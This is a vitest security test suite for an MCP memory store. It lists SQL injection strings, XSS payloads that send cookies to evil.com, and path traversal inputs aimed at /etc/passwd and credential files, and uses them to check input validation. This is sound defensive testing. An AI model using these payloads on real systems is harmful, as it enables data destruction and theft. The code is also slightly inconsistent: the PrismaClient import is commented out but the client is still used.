/**
 * Cortex MCP System - Security Validation Tests
 *
 * Comprehensive security testing suite to identify vulnerabilities
 * and ensure proper input validation, access controls, and data integrity.
 *
 * @version 1.0.0
 */

import { describe, test, expect, beforeAll, afterAll } from 'vitest';
// PrismaClient removed - system now uses Qdrant + PostgreSQL architecture';
import { validateMemoryStoreInput, validateMemoryFindInput, ValidationError } from '../../../src/schemas/mcp-inputs';
import { MemoryStoreInputSchema, MemoryFindInputSchema } from '../../../src/schemas/mcp-inputs';

describe('Security Validation Tests', () => {
  let prisma: PrismaClient;

  beforeAll(async () => {
    prisma = new PrismaClient();
  });

  afterAll(async () => {
    await prisma.$disconnect();
  });

  describe('Input Validation - SQL Injection Prevention', () => {
    test('should prevent SQL injection in memory_store queries', () => {
      const maliciousInputs = [
        "'; DROP TABLE entity; --",
        "'; DELETE FROM observation WHERE TRUE; --",
        "' OR '1'='1",
        "'; INSERT INTO entity (name, type) VALUES ('hacked', 'malicious'); --",
        "'; UPDATE entity SET name='hacked' WHERE TRUE; --",
        "'; SELECT * FROM entity; --",
        "' UNION SELECT * FROM entity --",
        "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --",
        "'; CREATE TABLE hacked (id INT); --",
        "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "'; WAITFOR DELAY '00:00:05'; --",
        "'; SHUTDOWN; --",
        "'; xp_cmdshell('dir'); --",
        "'; COPY entity TO '/tmp/hacked.csv'; --",
        "'; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO public; --"
      ];

      maliciousInputs.forEach(maliciousInput => {
        const testInput = {
          items: [{
            kind: 'entity',
            scope: { project: maliciousInput },
            data: { name: 'test' }
          }]
        };

        expect(() => validateMemoryStoreInput(testInput)).not.toThrow();
        // The input should be sanitized, not cause SQL errors
      });
    });

    test('should prevent SQL injection in memory_find queries', () => {
      const maliciousQueries = [
        "'; DROP TABLE entity; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM entity --",
        "'; SELECT pg_sleep(5); --",
        "'; COPY entity TO '/tmp/hack.csv'; --",
        "'; ALTER TABLE entity DROP COLUMN name; --",
        "'; TRUNCATE entity; --",
        "'; CREATE TABLE hack (id INT); --",
        "'; GRANT ALL ON SCHEMA public TO public; --",
        "' AND 1=1 --",
        "' OR 'x'='x",
        "'; EXECUTE IMMEDIATE 'DROP TABLE entity'; --"
      ];

      maliciousQueries.forEach(maliciousQuery => {
        const testInput = { query: maliciousQuery };

        expect(() => validateMemoryFindInput(testInput)).not.toThrow();
        // Query should be sanitized, not cause SQL errors
      });
    });
  });

  describe('Input Validation - XSS Prevention', () => {
    test('should sanitize XSS attempts in text fields', () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(1)',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<select onfocus="alert(1)" autofocus>',
        '<textarea onfocus="alert(1)" autofocus>',
        '<keygen onfocus="alert(1)" autofocus>',
        '<video><source onerror="alert(1)">',
        '<audio src="x" onerror="alert(1)">',
        '<details open ontoggle="alert(1)">',
        '<marquee onstart="alert(1)">',
        '"><script>alert(1)</script>',
        '\"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<script>document.location="http://evil.com"</script>',
        '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
        '<script>new Image().src="http://evil.com/steal?cookie="+document.cookie</script>'
      ];

      xssPayloads.forEach(payload => {
        const testInput = {
          items: [{
            kind: 'entity',
            scope: { project: 'test' },
            data: {
              name: payload,
              description: payload,
              content: `<div>${payload}</div>`
            }
          }]
        };

        const result = validateMemoryStoreInput(testInput);
        expect(result).toBeDefined();
        // The payload should be stored as-is but escaped when rendered
        expect(result.items[0].data.name).toBe(payload);
      });
    });
  });

  describe('Input Validation - Data Type Validation', () => {
    test('should reject invalid knowledge types', () => {
      const invalidTypes = [
        'invalid_type',
        'malicious',
        '<script>',
        "'; DROP TABLE entity; --",
        'admin',
        'root',
        'system',
        '../../../etc/passwd',
        '../../../../windows/system32/config/sam'
      ];

      invalidTypes.forEach(invalidType => {
        const testInput = {
          items: [{
            kind: invalidType,
            scope: { project: 'test' },
            data: { name: 'test' }
          }]
        };

        expect(() => validateMemoryStoreInput(testInput)).toThrow(ValidationError);
      });
    });

    test('should reject invalid search modes', () => {
      const invalidModes = [
        'malicious',
        'admin',
        '<script>',
        "'; DROP TABLE entity; --",
        'root',
        'SYSTEM',
        'UNION',
        'SELECT'
      ];

      invalidModes.forEach(invalidMode => {
        const testInput = {
          query: 'test',
          mode: invalidMode
        };

        expect(() => validateMemoryFindInput(testInput)).toThrow(ValidationError);
      });
    });

    test('should validate numeric constraints', () => {
      const invalidTopKValues = [-1, 0, 101, 1000, 999999, 'abc', null, undefined, NaN, Infinity];

      invalidTopKValues.forEach(invalidValue => {
        const testInput = {
          query: 'test',
          top_k: invalidValue
        };

        expect(() => validateMemoryFindInput(testInput)).toThrow();
      });
    });
  });

  describe('Input Validation - Boundary Testing', () => {
    test('should handle extremely long inputs', () => {
      const longString = 'a'.repeat(1000000); // 1MB string
      const veryLongString = 'a'.repeat(10000000); // 10MB string

      // Query length should be limited
      expect(() => validateMemoryFindInput({ query: veryLongString })).toThrow();

      // Project name length should be reasonable
      expect(() => validateMemoryStoreInput({
        items: [{
          kind: 'entity',
          scope: { project: longString },
          data: { name: 'test' }
        }]
      })).not.toThrow();
    });

    test('should handle special characters and unicode', () => {
      const specialChars = [
        '\x00', // Null byte
        '\r\n', // CRLF injection
        '\t\n\r', // Control characters
        '\u0000', // Unicode null
        '\uFEFF', // BOM
        '\u202E', // Right-to-left override
        '\u200E', // Left-to-right mark
        '\u2066', // Left-to-right isolate
        '\u2067', // Right-to-left isolate
        '\u2069', // Pop directional isolate
        '\uFFFD', // Replacement character
        '😀🎉🚀', // Emojis
        'ñáéíóú', // Accented characters
        '中文', // Chinese
        'العربية', // Arabic
        'עברית', // Hebrew
        '🏴‍☠️', // Complex emoji
        '👨‍👩‍👧‍👦', // Family emoji
        '🤖💻', // Tech emojis
      ];

      specialChars.forEach(char => {
        const testInput = {
          items: [{
            kind: 'entity',
            scope: { project: 'test' },
            data: {
              name: `test${char}name`,
              content: `content with ${char} special chars`
            }
          }]
        };

        expect(() => validateMemoryStoreInput(testInput)).not.toThrow();
      });
    });

    test('should handle malformed JSON', () => {
      const malformedJsonInputs = [
        { items: 'not an array' },
        { items: [{ kind: 'entity' }] }, // Missing required fields
        { items: [{ kind: 'entity', scope: 'not an object', data: {} }] },
        { items: [{ kind: 'entity', scope: {}, data: 'not an object' }] },
        { items: [{ kind: 'entity', scope: { project: null }, data: {} }] },
        { query: 123 }, // Query should be string
        { query: null },
        { query: undefined },
        { scope: 'not an object' },
        { types: 'not an array' },
        { types: [123] } // Types should be strings
      ];

      malformedJsonInputs.forEach(input => {
        if (input.items) {
          expect(() => validateMemoryStoreInput(input)).toThrow();
        } else {
          expect(() => validateMemoryFindInput(input)).toThrow();
        }
      });
    });
  });

  describe('Access Control - Scope Isolation', () => {
    test('should enforce scope boundaries', async () => {
      const projectId1 = 'security-test-project-1';
      const projectId2 = 'security-test-project-2';

      // Create entities in different projects
      await prisma.entity.create({
        data: {
          name: 'Secret Entity 1',
          type: 'secret',
          project: projectId1,
          created_by: 'security-test'
        }
      });

      await prisma.entity.create({
        data: {
          name: 'Secret Entity 2',
          type: 'secret',
          project: projectId2,
          created_by: 'security-test'
        }
      });

      // Test scope isolation by searching with specific project scope
      const results1 = await prisma.entity.findMany({
        where: { project: projectId1 }
      });

      const results2 = await prisma.entity.findMany({
        where: { project: projectId2 }
      });

      expect(results1).toHaveLength(1);
      expect(results2).toHaveLength(1);
      expect(results1[0].project).toBe(projectId1);
      expect(results2[0].project).toBe(projectId2);

      // Cleanup
      await prisma.entity.deleteMany({
        where: {
          project: { in: [projectId1, projectId2] },
          created_by: 'security-test'
        }
      });
    });

    test('should prevent unauthorized data access', async () => {
      const projectId = 'security-test-unauthorized';
      const maliciousProjectId = '../../../etc/passwd';
      const sqlInjectionProjectId = "'; SELECT * FROM entity; --";

      // Create legitimate data
      await prisma.entity.create({
        data: {
          name: 'Legitimate Entity',
          type: 'test',
          project: projectId,
          created_by: 'security-test'
        }
      });

      // Try to access with malicious project names
      const maliciousResults1 = await prisma.entity.findMany({
        where: { project: maliciousProjectId }
      });

      const maliciousResults2 = await prisma.entity.findMany({
        where: { project: sqlInjectionProjectId }
      });

      expect(maliciousResults1).toHaveLength(0);
      expect(maliciousResults2).toHaveLength(0);

      // Cleanup
      await prisma.entity.deleteMany({
        where: {
          project: projectId,
          created_by: 'security-test'
        }
      });
    });
  });

  describe('Data Integrity - Schema Constraints', () => {
    test('should respect database constraints', async () => {
      // Test unique constraints
      const entityId = 'test-entity-unique';

      await prisma.entity.create({
        data: {
          id: entityId,
          name: 'Test Entity',
          type: 'test',
          project: 'security-test',
          created_by: 'security-test'
        }
      });

      // Try to create duplicate
      await expect(
        prisma.entity.create({
          data: {
            id: entityId,
            name: 'Duplicate Entity',
            type: 'test',
            project: 'security-test',
            created_by: 'security-test'
          }
        })
      ).rejects.toThrow();

      // Cleanup
      await prisma.entity.delete({
        where: { id: entityId }
      });
    });

    test('should validate UUID formats', async () => {
      const invalidUUIDs = [
        'not-a-uuid',
        '123-456-789',
        '00000000-0000-0000-0000-000000000000', // Valid but might not exist
        'malicious-uuid-injection',
        "'; DROP TABLE entity; --",
        '../../../etc/passwd',
        'admin',
        'root'
      ];

      for (const invalidUUID of invalidUUIDs) {
        // Test with observation table which has UUID foreign key
        await expect(
          prisma.observation.create({
            data: {
              entity_id: invalidUUID,
              fact: 'Test observation',
              project: 'security-test',
              created_by: 'security-test'
            }
          })
        ).rejects.toThrow();
      }
    });

    test('should validate data type constraints', async () => {
      // Test decimal precision constraints
      await expect(
        prisma.risk.create({
          data: {
            title: 'Test Risk',
            description: 'Test description',
            impact_probability: 1.5, // Should be <= 1.0
            impact_severity: 'low',
            project: 'security-test',
            created_by: 'security-test'
          }
        })
      ).rejects.toThrow();

      await expect(
        prisma.risk.create({
          data: {
            title: 'Test Risk',
            description: 'Test description',
            impact_probability: -0.1, // Should be >= 0
            impact_severity: 'low',
            project: 'security-test',
            created_by: 'security-test'
          }
        })
      ).rejects.toThrow();
    });
  });

  describe('Error Handling - Information Disclosure', () => {
    test('should not leak sensitive information in error messages', () => {
      const sensitiveInputs = [
        { query: 'SELECT * FROM users WHERE password LIKE "%admin%"' },
        { query: '../database.sqlite' },
        { query: '../../.env' },
        { query: '/etc/passwd' },
        { query: 'C:\\Windows\\System32\\config\\SAM' },
        { query: 'process.env.QDRANT_URL' },
        { query: 'process.env.API_KEY' }
      ];

      sensitiveInputs.forEach(input => {
        try {
          validateMemoryFindInput(input);
        } catch (error) {
          expect(error.message).not.toContain('password');
          expect(error.message).not.toContain('QDRANT_URL');
          expect(error.message).not.toContain('API_KEY');
          expect(error.message).not.toContain('C:\\Windows');
          expect(error.message).not.toContain('/etc/passwd');
          expect(error.message).not.toContain('.env');
        }
      });
    });

    test('should sanitize stack traces in production', () => {
      try {
        validateMemoryStoreInput({ items: 'invalid' });
      } catch (error) {
        // In production, stack traces should be sanitized
        // This test would need to be adapted based on actual error handling
        expect(error.message).toBeDefined();
      }
    });
  });

  describe('Schema Validation - Business Logic', () => {
    test('should validate required fields', () => {
      const missingRequiredFields = [
        { items: [{ kind: 'entity', data: {} }] }, // Missing scope
        { items: [{ scope: { project: 'test' }, data: {} }] }, // Missing kind
        { items: [{ kind: 'entity', scope: { project: '' }, data: {} }] }, // Empty project
        { items: [{ kind: 'entity', scope: {}, data: {} }] }, // Empty scope
        { query: '' }, // Empty query
        { query: null }, // Null query
        { query: undefined } // Undefined query
      ];

      missingRequiredFields.forEach(input => {
        if (input.items) {
          expect(() => validateMemoryStoreInput(input)).toThrow();
        } else {
          expect(() => validateMemoryFindInput(input)).toThrow();
        }
      });
    });

    test('should validate field lengths', () => {
      const longProjectName = 'a'.repeat(1000); // Very long project name
      const veryLongProjectName = 'a'.repeat(10000); // Extremely long

      // Should handle reasonable length
      expect(() => validateMemoryStoreInput({
        items: [{
          kind: 'entity',
          scope: { project: longProjectName },
          data: { name: 'test' }
        }]
      })).not.toThrow();

      // Database has varchar(100) constraint, but validation allows more
      // The database will reject if too long
      expect(() => validateMemoryStoreInput({
        items: [{
          kind: 'entity',
          scope: { project: veryLongProjectName },
          data: { name: 'test' }
        }]
      })).not.toThrow();
    });

    test('should validate enum values', () => {
      const validKinds = [
        'section', 'decision', 'issue', 'todo', 'runbook', 'change',
        'release_note', 'ddl', 'pr_context', 'entity', 'relation',
        'observation', 'incident', 'release', 'risk', 'assumption'
      ];

      const validModes = ['auto', 'fast', 'deep'];

      validKinds.forEach(kind => {
        expect(() => validateMemoryStoreInput({
          items: [{
            kind,
            scope: { project: 'test' },
            data: { name: 'test' }
          }]
        })).not.toThrow();
      });

      validModes.forEach(mode => {
        expect(() => validateMemoryFindInput({
          query: 'test',
          mode
        })).not.toThrow();
      });
    });
  });
});